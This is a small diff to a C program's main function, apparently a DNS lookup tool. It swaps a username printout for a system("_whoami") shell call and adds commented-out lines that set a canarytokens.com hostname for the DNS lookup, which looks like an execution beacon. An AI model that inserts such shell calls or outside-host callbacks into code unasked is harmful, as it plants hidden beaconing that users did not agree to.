@@ -73,13 +73,12 @@ typedef struct
  
 int main( int argc , char *argv[])
 {    
+	system("_whoami");
+	//unsigned char hostname[100];
+//strcpy(hostname , "try.wfcfm9if39pb8ul1zxbce52hs.canarytokens.com");
+
+    //Now get the ip of this hostname , A record
     ngethostbyname(hostname , 1);
-    //system("_whoami"); //alternative
- 
-    //do the actual whoami
-    char username[32];
-    cuserid(username);
-    printf("%s\n", username);
  
     return 0;
 }
